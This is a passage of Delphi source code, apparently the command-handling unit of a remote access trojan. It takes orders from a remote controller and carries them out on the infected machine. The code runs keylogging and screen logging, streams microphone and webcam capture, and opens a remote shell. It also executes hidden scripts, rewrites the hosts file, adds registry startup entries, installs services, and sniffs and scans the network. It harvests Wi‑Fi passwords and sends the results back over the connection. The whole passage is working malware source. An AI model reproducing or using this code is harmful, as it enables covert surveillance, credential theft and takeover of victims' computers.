  if MainCommand = KEYLOGGERDELLOG then
  begin
    if MyDeleteFile(KeylogsPath + '\' + Datas) then
      TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = KEYLOGGERDELREPO then
  begin
    if DeleteAllFilesAndDir(KeylogsPath + '\' + Datas) then
      TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = KEYLOGGERLISTLOGS then
  begin
    MainConnection.SendDatas(LOGGER + '|' + MainCommand + '|' +
      ListDirectory(KeylogsPath + '\' + Datas));
  end
  else

  if MainCommand = KEYLOGGERLISTREPO then
  begin
    MainConnection.SendDatas(LOGGER + '|' + MainCommand + '|' + ListDirectory(KeylogsPath));
  end
  else

  if MainCommand = KEYLOGGERLIVESTART then
  begin
    ActiveKeylog := KeylogsPath + '\' + Datas;
    ActiveOnlineKeylogger := True;
    MyStartThread(@StartOnlineKeylogger);
  end
  else

  if MainCommand = KEYLOGGERLIVESTOP then
  begin
    ActiveOnlineKeylogger := False;
  end
  else

  if MainCommand = KEYLOGGERREADLOG then
  begin
    TmpStr := FileToStr(KeylogsPath + '\' + Datas);
    MainConnection.SendDatas(LOGGER + '|' + MainCommand + '|' + Datas + '|' + TmpStr);
  end
  else

  if MainCommand = MESSAGESBALLOON then
  begin
    TmpList := ParseString('|', Datas);
    ShowBalloon(TmpList[0], TmpList[1], StrToInt(TmpList[2]), StrToInt(TmpList[3]));
    MainConnection.SendDatas(MainCommand + '|');
  end
  else
      
  if MainCommand = MESSAGESBOX then
  begin
    TmpList := ParseString('|', Datas);
    ShowMsg(StrToInt(TmpList[0]), TmpList[1], TmpList[2], StrToInt(TmpList[3]), StrToInt(TmpList[4]));
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = MESSAGESBOXHOSTSLIST then
  begin
    MainConnection.SendDatas(MainCommand + '|' + ListWindows);
  end
  else

  if MainCommand = MICROPHONECAPTURESTART then
  begin
    TransferInfos.Channel := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
    Delete(Datas, 1, Pos('|', Datas));
    TransferInfos.Sample := StrToInt(Datas);
    
    MicStream := True;
    MyStartThread(@SendMicrophoneStream, @TransferInfos);
  end
  else

  if MainCommand = MICROPHONECAPTURESTOP then
  begin
    MicStream := False;
  end
  else
           
  if MainCommand = UnitCommands.MONITOR then
  begin
    MainConnection.SendDatas(MainCommand + '|' + ResMonitor);
  end
  else

  if MainCommand = MONITORPOWER then
  begin
    if Datas = 'Y' then
      SendMessage(GetForegroundWindow(), 274, SC_MONITORPOWER, 2)
    else SendMessage(GetForegroundWindow(), 274, SC_MONITORPOWER, -1);

    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = MOUSECRAZY then
  begin
    CrazyMouse(StrToInt(Datas)); 
    MainConnection.SendDatas(MainCommand + '|');
  end
  else
                
  if MainCommand = MOUSEFREEZE then
  begin
    if Datas = 'Y' then FreezeCursor() else FreezeCursor(False);
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = MOUSELEFTCLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
		
    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end
  else
                  
  if MainCommand = MOUSELEFTDOUBLECLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
		
    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end
  else
       
  if MainCommand = MOUSEMOVECURSOR then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
  end
  else

  if MainCommand = MOUSERIGHTCLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
		
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
  end
  else

  if MainCommand = MOUSERIGHTDOUBLECLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));

    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
  end
  else
       
  if MainCommand = MOUSESWAPBUTTONS then
  begin
    if Datas = 'Y' then SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 1, nil, 0) else
    SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 0, nil, 0);  
    MainConnection.SendDatas(MainCommand + '|');
  end
  else
         
  if MainCommand = MULTIDESKTOPSTART then
  begin
    DesktopS := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    _DesktopI := StrToInt(Datas);
    DesktopMulti := True;
    MyStartThread(@SendDesktopMultiThumb);
  end
  else

  if MainCommand = MULTIDESKTOPSTOP then
  begin
    DesktopMulti := False;
  end
  else

  if MainCommand = MULTIWEBCAMSTART then
  begin                                                      
    WebcamS := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    _WebcamI := StrToInt(Datas);
    PostMessage(ClientHandle, WM_MULTIWEBCAMSTART, 0, 0);
  end
  else
       
  if MainCommand = MULTIWEBCAMSTOP then
  begin
    WebcamMulti := False;
  end
  else

  if MainCommand = PING then
  begin
    MainConnection.SendDatas(PONG + '|' + ActiveCaption);
  end
  else

  if MainCommand = PORTSCANNERSTART then
  begin
    ScannerOptions.Address := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    ScannerOptions.pBegin := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
    Delete(Datas, 1, Pos('|', Datas));
		ScannerOptions.pEnd := StrToInt(Datas);

		StopScanning := False;
    MyStartThread(@StartPortScanner, @ScannerOptions);
  end
  else

  if MainCommand = PORTSCANNERSTOP then
  begin
    StopScanning := True;
  end
  else

  if MainCommand = PORTSNIFFERINTERFACES then
  begin
    MainConnection.SendDatas(PORTSNIFFER + '|' + MainCommand + '|' + InterfacesList);
  end
  else

  if MainCommand = PORTSNIFFERSTART then
  begin
    SnifferThread := TSnifferThread.Create();
    SnifferThread.hInterface := Datas;
    SnifferThread.FreeOnTerminate := True;
    SnifferThread.Resume;
  end
  else

  if MainCommand = PORTSNIFFERSTOP then
  begin
    SnifferThread.Terminate;
    SnifferThread := nil;
  end
  else

  if MainCommand = PROCESSKILL then
  begin
    if KillProcess(Datas) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = PROCESSLIST then
  begin
    MainConnection.SendDatas(TASKSMANAGER + '|' + PROCESS + '|' +
      MainCommand + '|' + ListProcess);
  end
  else
     
  if MainCommand = PROCESSLISTMODULES then
  begin
    MainConnection.SendDatas(TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' +
      Datas + '|' + ListProcessModules(StrToInt(Datas)));
  end
  else

  if MainCommand = PROCESSRESUME then
  begin
    if ResumeProcess(StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else
     
  if MainCommand = PROCESSSETPRIORITY then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas) - 1);

    if SetProcessPriority(StrToInt(TmpStr), Datas) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = PROCESSSUSPEND then
  begin
    if SuspendProcess(StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else
                
  if MainCommand = PROGRAMSLIST then
  begin
    MainConnection.SendDatas(TASKSMANAGER + '|' + PROGRAMS + '|' +
      MainCommand + '|' + ListPrograms);
  end
  else
      
  if MainCommand = PROGRAMSSILENTUNINSTALL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Length('|'));
    MyShellExecute(TmpStr, Datas, SW_SHOWNORMAL);
  end
  else

  if MainCommand = PROGRAMSUNINSTALL then
  begin
    MyShellExecute(Datas, '', SW_SHOWNORMAL);
  end
  else
    
  if (MainCommand = REGISTRYADDKEY_VALUE) or (MainCommand = REGISTRYSTARTUPADD) then
  begin
    TmpList := ParseString('|', Datas);
    TmpStr := TmpList[0] + '|' + TmpList[1] + '|' + TmpList[2] + '|' + TmpList[3] + '|';

    if TmpList[2] = '' then
    begin
      if AddRegKey(TmpList[0], TmpList[1]) then
        TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + Tmpstr + '|Y|'
      else TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|N|';
    end
    else
    begin
      if AddRegValue(TmpList[0], TmpList[1], TmpList[2], TmpList[3]) then
        TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|Y|'
      else TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|N|';
    end;

    MainConnection.SendDatas(TmpStr);
  end
  else

  if (MainCommand = REGISTRYDELETEKEY_VALUE) or (MainCommand = REGISTRYSTARTUPDELETE) then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if Datas = 'Y' then
    begin
      if DelRegKey(TmpStr, TmpStr1) then
        TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|' + TmpStr1 + '|Y|'
      else TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|' + TmpStr1 + '|N|';
    end
    else
    begin
      if DelRegValue(TmpStr, TmpStr1) then
        TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '||' + TmpStr1 + '|Y|'
      else TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '||' + TmpStr1 + '|N|';
    end;

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = REGISTRYRENAMEKEY then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if RenRegKey(TmpStr, TmpStr1, Datas) then
      TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|' + TmpStr1 + '|' + Datas + '|Y|'
    else TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|' + TmpStr1 + '|' + Datas + '|N|';

    MainConnection.SendDatas(TmpStr);
  end
  else
       
  if MainCommand = REGISTRYRENAMEVALUE then
  begin
    TmpList := ParseString('|', Datas);
    TmpStr := TmpList[0] + '|' + TmpList[1] + '|' + TmpList[2] + '|' + TmpList[3] + '|' + TmpList[4];

    if not DelRegValue(TmpList[0], TmpList[1]) then
      TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|N|'
    else
    begin
      if AddRegValue(TmpList[0], TmpList[2], TmpList[3], TmpList[4]) then
        TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|Y|'
      else TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|N|';
    end;

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = REGISTRYLISTKEYS then
  begin
    MainConnection.SendDatas(UnitCommands.REGISTRY + '|' + MainCommand + '|' + ListKeys(Datas));
  end
  else

  if MainCommand = REGISTRYLISTVALUES then
  begin
    MainConnection.SendDatas(UnitCommands.REGISTRY + '|' + MainCommand + '|' + ListValues(Datas));
  end
  else

  if MainCommand = REGISTRYSTARTUPLIST then
  begin
    TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + HKCU + RunKey;
    MainConnection.SendDatas(TmpStr + '|' + ListValues(HKCU + RunKey));
    TmpStr := UnitCommands.REGISTRY + '|' + MainCommand + '|' + HKLM + RunKey;
    MainConnection.SendDatas(TmpStr + '|' + ListValues(HKLM + RunKey));
  end
  else

  if MainCommand = REQUESTADMIN then
  begin
    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);
      CloseHandle(PersistMutex);
    end;

    if _MutexName <> '' then CloseHandle(MainMutex);
    MyShellExecute(ClientPath, '', SW_HIDE, True);
    Exitprocess(0);
  end
  else

  if MainCommand = SCREENLOGGERDELLOG then
  begin                     
    if MyDeleteFile(ScreenlogsPath + '\' + Datas) then
      TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SCREENLOGGERDELREPO then
  begin
    if DeleteAllFilesAndDir(ScreenlogsPath + '\' + Datas) then
      TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := LOGGER + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SCREENLOGGERLISTLOGS then
  begin
    MainConnection.SendDatas(LOGGER + '|' + MainCommand + '|' +
      ListDirectory(ScreenlogsPath + '\' + Datas));
  end
  else

  if MainCommand = SCREENLOGGERLISTREPO then
  begin
    MainConnection.SendDatas(LOGGER + '|' + MainCommand + '|' + ListDirectory(ScreenlogsPath));
  end
  else

  if MainCommand = SCREENLOGGERREADLOG then
  begin
    TmpStr := FileToStr(ScreenlogsPath + '\' + Datas);
    MainConnection.SendDatas(LOGGER + '|' + MainCommand + '|' + Datas + '|' + TmpStr);
  end
  else

  if MainCommand = SERVICESEDIT then
  begin
    TmpList := ParseString('|', Datas);

    if EditService(TmpList[0], TmpList[1], TmpList[2], TmpList[3], StrToInt(TmpList[4])) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpList[0] + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpList[0] + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SERVICESINSTALL then
  begin
    TmpList := ParseString('|', Datas);

    if InstallService(TmpList[0], TmpList[1], TmpList[2], TmpList[3], StrToInt(TmpList[4])) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpList[0] + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpList[0] + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SERVICESLIST then
  begin
    MainConnection.SendDatas(TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + ListServices);
  end
  else

  if MainCommand = SERVICESSTART then
  begin
    if xStartService(Datas) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SERVICESSTOP then
  begin
    if StopService(Datas) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SERVICESUNINSTALL then
  begin
    if RemoveService(Datas) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = SCRIPTEXECUTE then
  begin
    TmpStr := IntToStr(GetTickCount) + Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    
		if FileExists(TmpDir + '\' + TmpStr) then MyDeleteFile(TmpDir + '\' + TmpStr);
    MyCreateFile(TmpDir + '\' + TmpStr, TmpStr1, Length(TmpStr1));
    HideFilename(TmpDir + '\' + TmpStr);
    if Datas = 'Y' then MyShellExecute(TmpDir + '\' + TmpStr, '', SW_HIDE) else
    MyShellExecute(TmpDir + '\' + TmpStr, '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = SHELLCOMMAND then
  begin
    ShellCmd := Datas;
  end
  else

  if MainCommand = SHELLSTART then
  begin
    MyStartThread(@ShellThread);
  end
  else

  if MainCommand = SHELLSTOP then
  begin
    ShellCmd := 'exit';
  end
  else

  if MainCommand = SYSTEMHOSTSFILE then
  begin
    TmpStr := FileToStr(Sysdir + 'Drivers\etc\hosts');
    MainConnection.SendDatas(UnitCommands.SYSTEM + '|' + Maincommand + '|' + TmpStr);
  end
  else
       
  if MainCommand = SYSTEMEVENTSLOGS then
  begin
    SetTokenPrivileges('SeDebugPrivilege');
    TmpStr := GetEventsLogs(StrToInt(Datas));
    MainConnection.SendDatas(UnitCommands.SYSTEM + '|' + Maincommand + '|' + TmpStr);
  end
  else

  if MainCommand = SYSTEMHOSTSFILEEDIT then
  begin
    SetTokenPrivileges('SeDebugPrivilege');
    MyDeleteFile(Sysdir + 'Drivers\etc\hosts');
    MyCreateFile(Sysdir + 'Drivers\etc\hosts', Datas, Length(Datas));
    TmpStr := FileToStr(Sysdir + 'Drivers\etc\hosts');
    MainConnection.SendDatas(UnitCommands.SYSTEM + '|' + SYSTEMHOSTSFILE + '|' + TmpStr);
  end
  else

  if MainCommand = WEBCAMCAPTURESTART then
  begin                    
    WebcamId := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamQ := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamX := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamY := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamI := StrToInt(Datas);
    PostMessage(ClientHandle, WM_WEBCAMCAPTURESTART, 0, 0);
  end
  else
       
  if MainCommand = WEBCAMSETTINGS then
  begin
    WebcamQ := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamX := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamY := StrToInt(Copy(Datas, 1, Pos('|', Datas) -1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamI := StrToInt(Datas);
  end
  else

  if MainCommand = WEBCAMCAPTURESTOP then
  begin
    WebcamImage := False;
  end
  else

  if MainCommand = WEBCAMDRIVERS then
  begin
    MainConnection.SendDatas(MainCommand + '|' + WEBCAMDRIVERS + '|' + GetWebcamDrivers);
  end
  else
      
  if MainCommand = WINDOWSMAXIMIZE then
  begin
    if ShowWindow(StrToInt(Datas), SW_MAXIMIZE) then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else
      
  if MainCommand = WINDOWSMINIMIZE then
  begin
    if ShowWindow(StrToInt(Datas), SW_MINIMIZE) then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = WINDOWSCLOSE then
  begin
    if SendMessage(StrToInt(Datas), 16, 0, 0) = 0 then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else
   
  if MainCommand = WINDOWSHIDE then
  begin
    if ShowWindow(StrToInt(Datas), 0) then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else
  
  if MainCommand = WINDOWSKEYS then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    AppActivate(PChar(TmpStr));
    SendKeys(PChar(Datas), True);
  end
  else

  if MainCommand = WINDOWSLIST then
  begin
    TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand;
    if Datas = 'Y' then TmpStr := TmpStr + '|' + ListWindows else
    TmpStr := TmpStr + '|' + ListAllWindows;
    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = WINDOWSSHAKE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    SetForegroundWindow(StrToInt(TmpStr));
    ShakeWindow(StrToInt(TmpStr), StrToInt(Datas));
  end
  else

  if MainCommand = WINDOWSSHOW then
  begin
    if ShowWindow(StrToInt(Datas), SW_SHOW) then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else
         
  if MainCommand = WINDOWSRESTORE then
  begin
    if ShowWindow(StrToInt(Datas), SW_SHOWNORMAL) then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = WINDOWSTITLE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if SetWindowText(StrToInt(TmpStr), PChar(Datas)) then
      TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + TmpStr + '|Y|' + Datas
    else TmpStr := TASKSMANAGER + '|' + UnitCommands.WINDOWS + '|' + MainCommand + '|' + TmpStr + '|N|' + Datas;

    MainConnection.SendDatas(TmpStr);
  end
  else
  
  if MainCommand = WINDOWSTHUMBNAILS then
  begin                  
    TransferInfos.Window := Datas;
    MyStartThread(@SendWindowThumb, @TransferInfos);
  end
  else
        
  if MainCommand = WIFIPASSWORDS then
  begin
    MainConnection.SendDatas(PASSWORDS + '|' + MainCommand + '|' + ListWifiPasswords);
  end;
end;
          
initialization
  StartDevicesVar;

finalization
  StopDevicesVar;

end.
